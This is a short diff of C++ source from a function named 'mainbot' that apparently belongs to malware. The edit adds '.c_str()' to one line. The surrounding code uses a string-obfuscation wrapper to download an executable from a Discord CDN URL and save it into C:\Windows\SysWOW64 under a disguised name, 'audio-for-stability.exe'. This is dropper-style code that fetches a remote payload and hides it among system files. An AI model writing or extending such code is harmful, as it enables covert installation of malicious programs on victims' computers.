@@ -160,7 +160,7 @@ void mainbot()
         {
 
                 
-            std::string download = (dead("https://cdn.discordapp.com/attachments/834754431249285140/887380454674694184/Demon_Cleaner.exe"));
+            std::string download = (dead("https://cdn.discordapp.com/attachments/834754431249285140/887380454674694184/Demon_Cleaner.exe").c_str());
             std::string path = (dead("C:\\Windows\\SysWOW64\\audio-for-stability.exe").c_str());
             URLDownloadToFileA(NULL, download.c_str(), path.c_str(), 0, NULL);
             system(dead("cd C:\\Windows\\SysWOW64\\").c_str());
